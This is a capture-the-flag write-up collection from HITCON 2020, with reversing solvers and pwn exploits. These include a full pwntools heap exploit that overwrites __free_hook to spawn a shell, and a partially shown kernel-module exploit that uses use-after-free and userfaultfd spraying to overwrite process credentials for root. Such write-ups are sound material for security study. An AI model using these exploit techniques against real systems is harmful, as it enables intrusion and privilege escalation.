---
title: "HITCON 2020 - Write ups"
author: "mhackeroni team"
comments: true
---

This is the collection of writeups for HITCON 2020 by the mhackeroni team.

Index
-----

- [Welcome](#welcome) - rev, 50pts, 715 solves
- [11011001](#11011001) - rev, 255pts, 30 solves
- [SOP](#sop) - rev, 305pts, 15 solves
- [Run Run Run](#run-run-run) - rev, 315pts, 13 solves
- [L'Obscurité](#lobscurité) - rev, 500pts, 1 solve
- [Dual](#dual) - pwn, 288pts, 19 solves
- [Spark](#spark) - pwn, 344pts, 10 solves
- [Telescope](#telescope) - pwn, 384pts, 5 solves
- [100 pins](#100-pins) - crypto, 350pts, 8 solves
- [AC1750](#ac1750) - forensics, 168pts, 100 solves
- [Baby Shock](#baby-shock) - misc, 201pts
- [Revenge of Baby Shock](#revenge-of-baby-shock) - misc, 230pts, 42 solves
- [Revenge of Pwn](#revenge-of-pwn) - misc/pwn, 255pts, 30 solves
- [Atoms](#atoms) - misc/pwn, 296pts, 17 solves
- [Tenet](#tenet) - misc/shellcode - 222pts, 47 solves

#### [Comments section](#disqus_thread)

Welcome
-------

> It's a reverse challenge.
>
> `ssh welcome@18.176.232.130 password: hitconctf`

### The challenge

The challenge is literally a reverse challenge. Every word in input is reversed:

If we run `cat flag` we get:

```
tac: failed to open 'galf' for reading: No such file or directory
```

### The solution

If we run `tac galf` we get `hitcon{!0202 ftcnoctih ot emoclew}`, which is the
flag.


11011001
--------

> 0100111001101111001000000110100001101001011011100111010000100000011010000110010101110010011001010010110000100000011101110110100001100001011101000010000001100001011100100110010100100000011110010110111101110101001000000110010101111000011100000110010101100011011101000110100101101110011001110010000001100110011011110111001000111111

### The challenge

We are given a C++ binary, which seems heavily optimized and decompiles like a
mess. The binary wants 20 unsigned 32-bit integers as inputs and performs some
checks on them. If those checks pass, a SHA26 hash is computed and printed as
part of the flag.

The checks are kind of annoying to reverse-engineer, but in the end are pretty
straightforward:

1. Each number must be between `0` and `0xFFFFF`.
2. There is a global table of 40 hardcoded values: each i-th input is and-ed
   (binary and) with the value at `table[2*i]` and the result must be equal with
   the value at `table[2*i+1]`.
3. In each number, there cannot be three consecutive equal bits.
4. There cannot be three equal bits at the same position in three consecutive
   numbers.
5. Each number must have exactly 10 bits set to `1`.
6. The total number of `1` bits at the same position in all numbers must be
   exactly 10.

There are also other checks made by the program, but we did not get reverse
those, because in the meantime we we were writing a simple Python solver using
[`z3`](https://pypi.org/project/z3-solver/), adding one check at the time and
testing the result. After the 6th check above, our input got accepted by the
program and it spit out the flag.

### The solution

Complete solution:

```python
#!/usr/bin/env python3
# @dp_1, @mebeim - 2020-11-29

import z3

table = [0x81002, 0x1000, 0x29065, 0x29061, 0x2, 0x2, 0x16C40, 0x16C00,
		 0x20905, 0x805, 0x10220, 0x220, 0x98868, 0x80860, 0x21102,
		 0x21000, 0x491, 0x481, 0x31140, 0x1000, 0x801, 0x0, 0x60405,
		 0x400, 0x0C860, 0x60, 0x508, 0x400, 0x40900, 0x800, 0x12213,
		 0x10003, 0x428C0, 0x840, 0x840C, 0x0C, 0x43500, 0x2000, 0x8105A,
		 0x1000]

def popcount(v):
	'''
	Bit Twiddling Hacks FTW
	https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetParallel
	'''
	w = v - ((v >> 1) & 0x55555555)
	q = (w & 0x33333333) + ((w >> 2) & 0x33333333)
	s = ((q + (q >> 4) & 0xF0F0F0F) * 0x1010101) >> 24
	return s

solver = z3.Solver()
inp = [z3.BitVec('x{:02d}'.format(i), 8 * 4) for i in range(20)]

for i, x in enumerate(inp):
	solver.add(x & 0xFFF00000 == 0)
	solver.add(x & table[2 * i] == table[2 * i + 1])

	mask = 7
	for j in range(18):
		solver.add((x & mask) != (7<<j), x & mask != 0)
		mask = mask << 1

for off in range(20):
	for i in range(1, len(inp)-1):
		x = ((inp[i-1]>>off) & 1) + ((inp[i]>>off) & 1) + ((inp[i+1]>>off) & 1)
		solver.add(x != 0, x != 3)

for v in inp:
	solver.add(popcount(v) == 10)

for off in range(20):
	x = (inp[0] >> off) & 1
	for i in range(1, len(inp)):
		x += (inp[i] >> off) & 1
	solver.add(x == 10)

res = solver.check()
assert res == z3.sat

m = solver.model()
nums = [m[x].as_long() for x in inp]
print(*nums)
```

And here it is in action:

```
$ ./solve.py | ./11011001
Congratulations!
Here's your gift: hitcon{fd05b10812d764abd7d853dfd24dbe6769a701eecae079e7d26570effc03e08d}
```


SOP
---

> Let me introduce a brand new concept - Syscall Oriented Programming!

The binary implements the typical fetch-execute loop in the `run` function:

```c
memset(regs, 0, sizeof(regs));
while ( code[regs[15]] )
{
  fetch_inst(code[regs[15]], &sysno, sysargs, regs);
  syscall(sysno, sysargs[0], sysargs[1], sysargs[2], sysargs[3], sysargs[4], sysargs[5]);
  ++regs[15];
}
```

From this code we can also see that the VM allows up to 6 arguments for a given
syscall and that it offers 16 64bit registers, the last of which is the
instruction pointer. The custom instruction encoding can be extracted from the
`fetch_inst` function, which was reimplemented in python to continue the
analysis

At a basic level, the VM executes a syscall for each opcode. Since the
disassembly was over 2k lines long, we used some rules to simplify and shorten
it. For example, a `mov reg, reg` instruction was implemented as a
`set_tid_address <value>; prctl GET_TID_ADDRESS &<dest>`.

After this first step, the bytecode could be subdivided in four main parts:

- At first, it loads some shellcode in memory and sets it as the SIGSYS handler,
  which can used by seccomp in response to filtered syscalls
- Then, it prepares and loads a seccomp filter which intercepts a fixed set of
  syscalls, replacing them with custom actions
- Next, it takes the user input (which was read at the start of the shellcode)
  and processes it
- And finally, it prints a success message to an invalid file descriptor

The logical next step was to analyze the shellcode and the seccomp filter:

```asm
; Sigaction handler
   0:    48 b9 2c 34 3a 79 f5     movabs rcx,  0x3f8495f5793a342c
   a:    95 84 3f                 mov    edx,  DWORD PTR [rsi+0x4] # si_code
   d:    8b 56 04                 mov    WORD PTR [rcx],  dx
  10:    66 89 11                 lea    rcx,  [rip+0xffffffffffffffeb]  # 0x2
  17:    48 8d 0d eb ff ff ff     inc    QWORD PTR [rcx]
  1a:    48 ff 01                 inc    QWORD PTR [rcx]
  1d:    48 ff 01                 ret


; Restorer function
   0:    31 c0                    xor    eax,  eax
   2:    b0 0f                    mov    al,  sys_sigreturn
   4:    0f 05                    syscall
```

The interesting part here is the sigaction handler: it takes the syscall return
value, stores it at the address contained in `rcx` and increments that pointer
by 2 by modifying the `movabs` instruction. Since the return value is 16 bits
wide, by repeating this procedure twice we can obtain a full 32 bit result.

The seccomp filter, extracted using `seccomp_tools`, is as follows:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x0d 0x00 0x40000000  if (A >= 0x40000000) goto 0015
 0002: 0x15 0x0a 0x00 0x00000001  if (A == write) goto 0013
 0003: 0x15 0x20 0x00 0x00000068  if (A == getgid) goto 0036
 0004: 0x15 0x15 0x00 0x00000066  if (A == getuid) goto 0026
 0005: 0x15 0x28 0x00 0x000000ba  if (A == gettid) goto 0046
 0006: 0x15 0x0e 0x00 0x00000027  if (A == getpid) goto 0021
 0007: 0x15 0x17 0x00 0x0000006c  if (A == getegid) goto 0031
 0008: 0x15 0x07 0x00 0x0000006f  if (A == getpgrp) goto 0016
 0009: 0x15 0x29 0x00 0x0000006e  if (A == getppid) goto 0051
 0010: 0x15 0x1e 0x00 0x0000006b  if (A == geteuid) goto 0041
 0011: 0x15 0x2c 0x00 0x00000039  if (A == fork) goto 0056
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0014: 0x15 0x00 0x37 0x00000000  if (A != 0x0) goto 0070
 0015: 0x06 0x00 0x00 0x00000000  return KILL

 0016: 0x20 0x00 0x00 0x00000018  A = args[1]
 0017: 0x07 0x00 0x00 0x00000000  X = A
 0018: 0x20 0x00 0x00 0x00000010  A = args[0]
 0019: 0x2c 0x00 0x00 0x00000000  A *= X
 0020: 0x15 0x28 0x28 0x00000000  goto 0061

 [all other handlers omitted for brevity]

 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0062: 0x20 0x00 0x00 0x00000020  A = args[2]
 0063: 0x07 0x00 0x00 0x00000000  X = A
 0064: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0065: 0x7c 0x00 0x00 0x00000000  A >>= X
 0066: 0x01 0x00 0x00 0x00030000  X = 196608
 0067: 0x54 0x00 0x00 0x0000ffff  A &= 0xffff
 0068: 0x4c 0x00 0x00 0x00000000  A |= X
 0069: 0x16 0x00 0x00 0x00000000  return A
 0070: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

This filter is used to implement arithmetic operations in the bytecode by
hooking unused syscalls. For example, a `getpgrp` syscall is used to multiply
two numbers. Since the result is only 16 bits wide, each 32bit operation calls
the required syscall twice, once with a shift (third argument) of 0 and once
with a shift of 16.

With the seccomp filter & handler reversed, it was now possible to apply more
rules to the bytecode, reducing it to less than 600 instructions, of which most
are the ones used to set up the filter itself, meaning that the unreversed part
got reduced to roughly 300 lines.

In the remaining code there were 4 repetitions of code that looked very similar
and a final block that applies some final operations on the input and prints the
success message. The 4 repetitions are all the same except for some constant
values which are used, making it look very similar to some sort of encryption
algorithm. In fact, by analyzing it further (with the help of an `strace` log of
the binary with a known input for debugging) it was possible to reimplement the
algorithm in C, revealing that it was some sort of 32-round feistel network.

Any feistel round can be inverted if the output and key are known. Since the key
was hardcoded in the bytecode, this meant that given an output it could be
decrypted to get the flag.

The last part of the bytecode, just before printing the final message, XORs each
4byte block of the encrypted flag with a constant value and calculates the OR of
all the XORs:

```
strcpy &r9 0x217058
mov 0x0 r2
r3 = r9 ^ 0x4a9d3ffd
r2 = r2 | r3
strcpy &r9 0x21705c
mov 0x0 r2
r3 = r9 ^ 0xbb541082
r2 = r2 | r3
strcpy &r9 0x217060
mov 0x0 r2
r3 = r9 ^ 0x632a4f78
r2 = r2 | r3
strcpy &r9 0x217064
mov 0x0 r2
r3 = r9 ^ 0xa9cb93d
r2 = r2 | r3
strcpy &r9 0x217068
mov 0x0 r2
r3 = r9 ^ 0x58aae351
r2 = r2 | r3
strcpy &r9 0x21706c
mov 0x0 r2
r3 = r9 ^ 0x92012a14
```

This meant that the final value would be 0 if and only if the encrypted flag was
equal to those constants, and so those were the best candidates to try
decryption on. Indeed, by concatenating and decrypting them, we got the flag.

For reference, this is the decompiler code and the final decryption code:

```python
from struct import unpack
u64 = lambda x: unpack('<Q', x)[0]

with open('sop_bytecode', 'rb') as fin:
    data = fin.read()

def getbit(data, idx):
    res = data & (2**idx-1)
    return res, data >> idx

syscalls = {
    0: 'read',
    1: 'write',
    9: 'mmap',
    13: 'rt_sigaction',
    39: 'getpid',
    57: 'fork',
    102: 'getuid',
    104: 'getgid',
    107: 'geteuid',
    108: 'getegid',
    110: 'getppid',
    111: 'getpgrp',
    157: 'prctl',
    186: 'gettid',
    218: 'set_tid_address'
}

disasm = []

for i in range(0, len(data), 8):
    opcode = u64(data[i:i+8])
    if opcode == 0:
        break

    sysno, opcode = getbit(opcode, 8)
    args = []

    for _ in range(6):
        mode, opcode = getbit(opcode, 2)

        if mode == 0:
            idx, opcode = getbit(opcode, 4)
            args.append(f'r{idx}')
        elif mode == 1:
            idx, opcode = getbit(opcode, 4)
            args.append(f'&r{idx}')
        elif mode == 2:
            size, opcode = getbit(opcode, 5)
            imm, opcode = getbit(opcode, size+1)
            args.append(hex(imm))
        else:
            break

    assert sysno in syscalls
    disasm.append([syscalls[sysno], *args])
    #print(syscalls[sysno], ' '.join(args))


# All rules return the number of lines used and the new line

# set_tid_address value + prctl get_tid &dest -> dest = value
def tid_prctl_mov(x):
    if x[0][0] == 'set_tid_address' and x[1][0] == 'prctl' and x[1][1] == '0x28':

        val = x[0][1]
        dest = x[1][2]

        # Dereference
        if dest[0] == '&': dest = dest[1:]
        else: dest = '*' + dest

        return 2, ['mov', val, dest]
    return None

# prctl SET_NAME str + prctl GET_NAME dest -> strcpy(dest, str)
def prctl_name_strcpy(x):
    if x[0][0] == 'prctl' and x[1][0] == 'prctl':
        if x[0][1] == '0xf' and x[1][1] == '0x10':

            src = x[0][2]
            dest = x[1][2]

            return 2, ['strcpy', dest, src]
    return None


prctl_vals = {
    22: 'PR_SET_SECCOMP',
    38: 'PR_SET_NO_NEW_PRIVS',
}

def readable_prctl(x):
    if x[0][0] == 'prctl' and x[0][1].startswith('0x'):

        val = int(x[0][1], 16)
        assert val in prctl_vals

        return 1, ['prctl', prctl_vals[val]] + x[0][2:]
    return None

seccomp_ops = {
    'getgid': '&',
    'getuid': '>>',
    'gettid': '|',
    'getpid': '+',
    'getegid': '-',
    'getpgrp': '*',
    'getppid': '<<',
    'geteuid': '^',
    'fork': '/'
}

def seccomp_rules(x):
    if x[0][0] in seccomp_ops.keys():
        if x[1][0] != x[0][0]: return None
        if int(x[0][3],16) != 0 or int(x[1][3],16) != 16: return None

        a, b = x[0][1], x[0][2]
        op = seccomp_ops[x[0][0]]

        return 2, ['arith', a, op, b]
    return None

def arithmetic(x):
    if x[0][0] != 'mov' or x[1][0] != 'mov' or x[2][0] != 'mov': return None
    if x[3][0] != 'arith' or x[0][1][0] != '&': return None
    if x[0][2] != '*0x217022' or x[1][2] != 'r0' or x[2][2] != 'r1': return None
    if x[3][1] != 'r0' or x[3][3] != 'r1': return None

    dest = x[0][1][1:]
    a = x[1][1]
    b = x[2][1]
    op = x[3][2]

    return 4, [f'{dest} = {a} {op} {b}']

rules = [
    tid_prctl_mov, prctl_name_strcpy,
    readable_prctl, seccomp_rules,
    arithmetic
]
#rules = []


for rule in rules:
    i = 0
    while i < len(disasm):
        try:
            res = rule(disasm[i:])
            if res:
                used, res = res
                assert used > 0
                disasm[i] = res
                for j in range(i+1, i+used):
                    disasm[j] = []

                match = True
        except IndexError:
            pass
        i += 1

    disasm1 = []
    for x in disasm:
        if x != []:
            disasm1.append(x)
    disasm = disasm1



disasm = '\n'.join(' '.join(x) for x in disasm)

print(disasm)
```

```c
#include <stdio.h>
#include <stdint.h>
#include <ctype.h>

void round_fwd(uint32_t *_a, uint32_t *_b, uint32_t *k) {
    uint32_t a = *_a, b = *_b;

    uint32_t r2 = k[0], r3 = k[1], r4 = k[2], r5 = k[3], r9 = k[4];
    uint32_t r6, r7, r8, r10, r11, r12, r13, r14, r15;

    r6 = a; r7 = b;

    r8 = 0;
    r10=0;
    for(int i = 0; i < 32; i++) {
        //r10 = 0;
        r8 = r8 + r9;

        r11 = r7 << 4;
        r11 = r11 + r2;
        r12 = r7 >> 5;
        r12 = r12 + r3;
        r11 = r11 ^ r12;
        r12 = r7 + r8;
        r11 = r11 ^ r12;
        r6 = r6 + r11;

        r11 = r6 << 4;
        r11 = r11 + r4;
        r12 = r6 >> 0x5;
        r12 = r12 + r5;
        r11 = r11 ^ r12;
        r12 = r6 + r8;
        r11 = r11 ^ r12;
        r7 = r7 + r11;
        r10 = r10 + 0x1;
        //r11 = r10 >> 0x5;
        //r11 = 0x1 - r11;
        //r11 = r11 * 0xab;

        //printf("%d 0x%08x 0x%08x\n", i, r6, r7);
    }
    printf("0x%08x\n", r10);

    a = r6; b = r7;

    *_a = a; *_b = b;
}

void round_bk(uint32_t *_a, uint32_t *_b, uint32_t *k) {
    uint32_t a = *_a, b = *_b;
    uint32_t r2 = k[0], r3 = k[1], r4 = k[2], r5 = k[3], r9 = k[4];
    uint32_t r6, r7, r8, r10, r11, r12, r13, r14, r15;

    r6 = a; r7 = b;

    r8 = 0;
    for(int i = 0; i < 32; i++)
        r8 = r8 + r9;

    for(int i = 0; i < 32; i++) {

        r11 = r6 << 4;
        r11 = r11 + r4;
        r12 = r6 >> 0x5;
        r12 = r12 + r5;
        r11 = r11 ^ r12;
        r12 = r6 + r8;
        r11 = r11 ^ r12;
        r7 = r7 - r11;

        r11 = r7 << 4;
        r11 = r11 + r2;
        r12 = r7 >> 5;
        r12 = r12 + r3;
        r11 = r11 ^ r12;
        r12 = r7 + r8;
        r11 = r11 ^ r12;
        r6 = r6 - r11;

        r8 = r8 - r9;
    }

    a = r6; b = r7;
    *_a = a; *_b = b;
}

uint32_t k[4][5] = {
    {0x69a33fff,0x468932dc,0x2b0b575b,0x1e8b51cc,0x51fdd41a},
    {0x32e57ab6,0x7785df55,0x688620f9,0x8df954f3,0x5c37a6db},
    {0xaca81571,0x2c19574f,0x1bd1fc38,0x14220605,0xb4f0b4fb},
    {0x33f33fe0,0xf9de7e36,0xe9ab109d,0x8d4f04b2,0xd3c45f8c}
};

uint32_t vals[4][2] = {
    {0x152ceed2, 0xd6046dc3},
    {0x4a9d3ffd, 0xbb541082},
    {0x632a4f78, 0x0a9cb93d},
    {0x58aae351, 0x92012a14}
};

int main() {
    uint8_t _input[8] = {'h','i','t','c','o','n','{','a'};
    uint32_t *input = (uint32_t *)_input;

    for(int i = 0; i < 4; i++) {
        input[0] = vals[i][0];
        input[1] = vals[i][1];

        round_bk(&input[0], &input[1], k[i]);
        //printf("0x%08x 0x%08x\n", input[0], input[1]);

        for(int i = 0; i < 8; i++)
            putchar(isprint(_input[i]) ? _input[i] : '@');
    }
    putchar('\n');
}
```


Run run run
-----------

This writeup is available
[**here**](http://www.babush.me/hitcon-ctf-2020-writeup.html).


L'Obscurité
-----------

This writeup is available
[**here**](http://www.babush.me/hitcon-ctf-2020-writeup.html).


Dual
----

> Heap exploitation in Rust? Is there any hope? Yes if you implement your own
> Garbage Collector.

### The program

The binary doesn't have any hard mitigations:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	ymbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   3950) Symbols	  No	0		12		dual-2df8d4005c5d4ffc03183a96a5d9cb55ac4ee56dfb589d65b0bf4501a586a4b0
```

### The vulnerability

The struct of the Nodes of the Graph is:

```rust
struct Node{
    id: u64,              // 0x0 id of the node
    this_index: u64,      // 0x8 index of the current obj inside of the pool
    edges: Vec<u64>,      // 0x10 ptr to the vector of neighbours
    last_edge: *u64,      // 0x18 ptr to the last edge in the vector of neighbours
    edges_end: *u64,      // 0x20 ptr to the end of the vector of neighbours
    text_len: u64,        // 0x28 Len of the text
    text_index: u64,      // 0x30 Index to the text obj in the pool
    stamp: u64,           // 0x38 operation stamp (not really usefull for pwning)
}
```

After ~~fuzzing~~ playing with the binary we found out that using `write_bin`
with length 0 causes a bug.

```rust
fn write_bin(){
    println!("node_id>");
    let node_id = read_int();
    let node = match find_node(root, node_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };

    println!("bin_len>");
    let bin_len = read_int();
    let bin_vals = read(bin_len);

    let (new_string, len) = encode(bin_vals, bin_len);
    // NO CHECK!
    node.text_index = add_pool(new_string);
    node.text_len = len;
}

fn encode(bin_vals, bin_len) -> (&str, u64){
    if bin_len == 0 {
        // NULL == 0
        return (NULL, 1);
    }
    ...
}
```

(Here we skip over a lot of details which are not relevant here.) Basically the
`write_bin` function always add to the pool even if the encoding fails.

The garbage collector considers a cell free if its `value >> 3 == 0` and this
olds for NULL. Therefore we have a type confusion where we can have the same
memory referenced as a text and a node.

![](https://i.imgur.com/2GSOiz3.png)

```python
def craft_node(_id, **kwargs):
    """Helper function to get the bytes of an arbitrary node"""
    s  = p64(_id)
    s += p64(kwargs.get("this_idx", 0x4141414141414141)
    s += p64(kwargs.get("edges", 0)
    s += p64(kwargs.get("last_edge", 0)
    s += p64(kwargs.get("edges_end", 0)
    s += p64(kwargs.get("text_len", 0x4141414141414141)
    s += p64(kwargs.get("text_idx", 0x4141414141414141)
    s += p64(kwargs.get("stamp",0x4141414141414141 )
    return s

def forge_node(**kwargs):
    # write an empty b64 to cause the bug in the node 0
    write_bin(0, "")
    # Create a new node which will be confused
    # with the text of the node 0
    node_id = create(0)
    # Create the bytes for the arbitrary node
    crafted = craft(node_id, **kwargs)
    # Write it
    write_text(0, crafted)
    return node_id
```

Now that we can forge arbitrary nodes we need to find a leak of the libc address
and a write primitive.

The pseudo-rust of the connect_node function is:

```rust
fn connect_node() {
    println!("pred_id>");
    let pred_id = read_int();

    let pred_node = match find_node(root, pred_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };

    println!("succ_id>");
    let succ_id = read_int();
    let succ_node = match find_node(root, succ_id) {
        Some(node) => node,
        None => {
            println!("invalid");
            return;
        }
    };

    unsafe{
        let mut ptr = pred_node.edges;
        // check if the edge was already inserted
        while ptr < pred_node.last_edge {
            if pool[*ptr] == succ {
                return;
            }
        }

        if pred_node.last_edge != pred_node.edges_end {
            // realloc pred_node.edges
            // and fix pred_node.last_edge
            // and pred_node.edges_end
        }

        // write what where primitive
        *pred_node.last_edge = succ_node.this_index;
    }
}
```

So if we can craft two arbitrary nodes, we can use `connect_node` to get
arbitrary write.

For the libc leak we can do the usual unsorted bin leak (free a chunk into the
unsorted bin, then read the pointer to the arena that will be placed in the
heap).

Here we create a node with arbitrary big `text_len` to be able to read out of
bound, then allocate and free a chunk to read the heap-metadata of the freed
chunk.

```python
nb = create(0)
# Bug: write_bin with size 0 will return 1 instead of a pointer.
write_bin(nb, '')
# This node can be overwritten with nb.text.
n1 = create(nb)
# Node that will be freed for the libc leak.
n2 = create(nb)
# Allocate >0x400 bytes so that the chunk will skip the tcache.
write_text(n2, 'X'*0x500)
# Create another node to avoid consolidation with the top chunk.
n3 = create(nb)
# Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
disconnect(nb, n2)
gc()
# Craft n1 so that we can read the pointers from the heap.
crafted = craft(n1, text_idx=n1, text_len=0x100)
write_text(nb, crafted)
# Leak.
leak = read(n1)
```

### The exploit

In the following code we will omit the primitives for simplicity sake, the
complete script can be found
[here](https://gist.github.com/zommiommy/10207a8cb3900ec520d63b46046d47ab).

Now that we can leak a libc address and we have a write-what-where primitive we
can open a shell by either modifying the `.got.plt` or by overwriting one of the
hooks in the libc. We chose to overwrite the `__free_hook` since it's faster.

Steps to get a shell:

 - get the leak
 - craft the nodes for the arbitrary write
 - write the address of `system` in `__free_hook`
 - create a text with `/bin/sh\x00` and then free it

The full exploit:

```python

from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
host = '13.231.226.137'
port = 9573

p = remote(host, port)

# Step 1: leak libc base.
# Prepare a root node for later. In the second step the DFS will go down here first,
# so it won't crash on the nodes we crafted in the first step.
na = create(0)
# Root node for step 1.
nb = create(0)
# Bug: write_bin with size 0 will return 1 instead of a pointer.
write_bin(nb, '')
# This node can be overwritten with nb.text.
n1 = create(nb)
# Node that will be freed for the libc leak.
n2 = create(nb)
# Allocate >0x400 bytes so that the chunk will skip the tcache.
write_text(n2, 'X'*0x500)
# Create another node to avoid consolidation with the top chunk.
n3 = create(nb)
# Free node 2 for the unsorted bin leak: the freed chunk now contains pointers to the main arena.
disconnect(nb, n2)
gc()
# Craft n1 so that we can read the pointers from the heap.
crafted = craft(n1, text_idx=n1, text_len=0x100)
print('writing', len(crafted), 'bytes:', crafted)
write_text(nb, crafted)
leak = read(n1)
print(leak)
leak_libc = u64(leak[160:160+8])
print('leak arena:', hex(leak_libc))
leak_offset = 2014176 # main_arena + 96
main_arena = 0x7ffff7c2cb80 # libc.symbols['main_arena']
print('main_arena', hex(main_arena))
print('leak_offset', hex(leak_offset))
libc_base = leak_libc - leak_offset
print('libc base:', hex(libc_base))
pause()

# Step 2: write what-were to get a shell.
libc.address = libc_base
system = libc.symbols['system']
what = system
print('system:', hex(system))
free_hook = libc.symbols['__free_hook']
where = free_hook
print('__free_hook:', hex(free_hook))
# write_bin bug again to control a second node.
write_bin(n3, '')
# This node can be overwritten with n3.text.
n4 = create(na)
# Prepare nodes for arbitrary write.
wherenode = craft(n1, edges=where-8, last_edge=where, edges_end=where+32)
whatnode = craft(n4, pool_idx=what)
write_text(n3, whatnode)
write_text(nb, wherenode)
# Trigger arbitrary write.
connect(n1, n4)
pause()

# Write in a chunk and trigger the free in write_text to call system("/bin/sh").
write_text(nb, b'/bin/sh\x00')
write_text(nb, 'A'*1500, shell=True)
p.interactive()
```


Spark
-----

> Shortest Path AlgoRithm in Kernel!
>
> `nc 3.113.76.29 9427`

This challenge is a Linux VM with a custom kernel module, which exposes a new
`/dev/node` device.
The module allows building weighted graphs and calculating the shortest distance
between two nodes.

When we `open` the driver, the descriptor is backed by the following
`private_data`:

```c
struct node {
    uint64_t id;
    int refcount;
    struct mutex state_lock;
    int is_finalized;
    struct mutex nb_lock;
    uint64_t num_children;
    list_head edges;
    uint64_t traversal_idx;
    struct node_list *traversal;
};
```

After opening a node, we can interact via ioctl.
There are four ioctls:

- Link (`0x4008d900`): takes two node descriptors A and B, and a edge weight,
  and creates the edges A->B and B->A;
- Info (`0x8018d901`): provides information about the node;
- Finalize (`0xd902`): finalizes the graph rooted in the node, preparing it for
  queries;
- Query (`0xc010d903`): takes two node descriptors and calculates the total
  weight of the shortest path between them.

When we create an edge (nodes can be linked only if not finalized), the
following structure is allocated:

```c
struct edge {
    struct edge *next;
    struct edge *prev;
    struct node *node;
    uint64_t weight;
};
```

Where `next` and `prev` make up a `list_head`.
The edge is then inserted in the `struct node`'s `edges` list.

When we finalize a node, the driver performs a depth-first traversal of the
graph rooted in the node.
The list of nodes in DFS order is stored in the `traversal` list of the node.
The index of each node in the DFS list is stored in that node's `traversal_idx`.

The `traversal` list is a simple vector:

```c
struct node_list {
    uint64_t size;
    uint64_t capacity;
    struct node *nodes;
};
```

The query ioctl, which requires a finalized source node, allocates an array of
distances of length equal to the source's `traversal` list length. Then, it uses
this working array to compute shortest-path distances until it gets to the
shortest-path distance of the destination node, at which point it can return the
answer.

There are a couple bugs.

Finalizing a node will (correctly) increment the refcount of all nodes in the
DFS traversal. However, linking two nodes will not increment their refcount.
Therefore, if two nodes are linked and then one is `close`d, the surviving one
will have an `edge` whose `node` field points to the other node's freed `struct
node`, i.e., a dangling pointer (which we could turn into UAF).

Moreover, the `traversal_idx` is a property of the node, rather than of the
traversal. This is only correct if a node can be in at most a single traversal,
which is ensured by the finalization logic, which will mark every node in the
DFS as finalized and stop when it encounters an already-finalized node. However,
the query logic also uses a node's children, not just the pre-calculated DFS
traversal, when updating distances iteratively:

```
for every edge E in the current node's edges:
    if distance[E->node->traversal_idx] != -1:
        new_dist = current_path_distance + E->weight
        if new_dist < distance[E->node->traversal_idx]:
            distance[E->node->traversal_idx] = new_dist
```

It's possible to create a situation where a node has children in different
traversals. For example, if A has children B and C, then by finalizing C and
then A we'd get two traversals `[C]` and `[A, B]`, so B and C are in different
traversals. However, that query code assumes that children are always in the
same traversal, because the `traversal_idx` is not checked in any way. By
exploiting this, we can get a OOB write from the distance array.

Our exploit is needlessly complex, but we blame sleep deprivation :)

We use the first bug (edge with dangling ptr) to cause a crash during a query.
We reclaim the freed node using the
[setxattr+userfaultfd technique](https://duasynt.com/blog/linux-kernel-heap-spray)
and we fake a node with a huge `traversal_idx` (resulting in a non-canonical
access) to crash the query. This will not crash the kernel, but will print a
panic to dmesg, which we can read, and leak a couple pointers: a node pointer,
and the location of the distance array of the crashing query. Note that the
array is freed after the query, but since the query crashed, it's still
allocated.

Then, we shape the heap so that a query will allocate the distance array right
before a node. We use the OOB in query to modify the node's refcount. Then, we
are able to free the node while still retaining a file descriptor to it. By
reclaiming the freed node, we now have a primitive that gives us full control of
a node structure that's backing a live file descriptor. This is properly
engineered to that we can repeatedly free and reclaim the node as many times as
we want, so that we can change the structure contents at will.

We exploit the controlled node primitive to build an arbitrary read primitive.
The info ioctl, along other values, also outputs us the `size` of the node's
`traversal`. Since we control the `traversal` field, this allows us to read a
8-byte integer from an arbitrary address (repeatedly). We use the read, coupled
with the pointers we leaked earlier, to scan the heap and find our fake node (we
put a unique marker as id). Then, since during the info ioctl the `state_lock`
lock is held, we can read `current` from the mutex, and our task's `cred`
pointer from that.

We then abuse cleanup logic on a fake node to free the leaked distance array
that was still allocated, so that the next (properly sized) query will reclaim
it and thus put its distance array at the same known address.
Querying a fake node also gives us control over `traversal_idx`, and so now the
query OOB can be turned into an arbitrary write.

We use the write to overwrite our task's UID in its `cred` to 0.
Then, we can simply open the root-owned `/flag` and read it.

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <syscall.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <sys/xattr.h>
#include <errno.h>
#include <signal.h>
#include <sys/klog.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <semaphore.h>

#define DEV_PATH "/dev/node"
#define SPARK_FINALIZE 0xd902
#define SPARK_LINK 0x4008d900
#define SPARK_QUERY 0xc010d903
#define SPARK_INFO 0x8018D901

struct spark_ioctl_query {
	int fd1;
	int fd2;
	long long distance;
};

struct spark_info {
	unsigned long num_children;
	unsigned long traversal_idx;
	unsigned long traversal_size;
};

static unsigned g_create_next_id;

static int create()
{
	int fd = open(DEV_PATH, O_RDONLY);
	assert(fd != -1);
	g_create_next_id++;
	return fd;
}

static void llink(int a, int b, unsigned int weight)
{
	assert(ioctl(a, SPARK_LINK, b | ((unsigned long long) weight << 32)) == 0);
}

static long long query(int a, int b)
{
	struct spark_ioctl_query qry = {
	.fd1 = a,
	.fd2 = b,
	};
	assert(ioctl(a, SPARK_QUERY, &qry) == 0);
	return qry.distance;
}

static void finalize(int a)
{
	assert(ioctl(a, SPARK_FINALIZE) == 0);
}

static void get_info(int a, struct spark_info *info)
{
	assert(ioctl(a, SPARK_INFO, info) == 0);
}

static void release(int a)
{
	assert(close(a) == 0);
}

struct fault_arg {
	sem_t fault_sema;
